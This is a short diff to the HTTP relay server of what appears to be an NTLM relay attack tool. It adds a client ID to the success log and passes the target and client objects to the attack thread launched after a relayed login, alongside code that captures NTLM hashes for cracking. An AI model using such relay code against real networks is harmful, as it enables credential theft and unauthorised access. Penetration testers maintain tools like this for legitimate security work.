@@ -464,7 +464,8 @@ class HTTPRelayServer(Thread):
                         self.do_AUTHHEAD(b'NTLM', proxy=proxy)
                 else:
                     # Relay worked, do whatever we want here...
-                    LOG.info("(HTTP): Authenticating connection from %s@%s against %s://%s SUCCEED" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
+                    self.client.setClientId()
+                    LOG.info("(HTTP): Authenticating connection from %s@%s against %s://%s SUCCEED [%s]" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
 
                     ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                         authenticateMessage['user_name'],
@@ -530,7 +531,7 @@ class HTTPRelayServer(Thread):
             if self.target.scheme.upper() in self.server.config.attacks:
                 # We have an attack.. go for it
                 clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
-                                                                               self.authUser)
+                                                                               self.authUser, self.target, self.client)
                 clientThread.start()
             else:
                 LOG.error('(HTTP): No attack configured for %s' % self.target.scheme.upper())
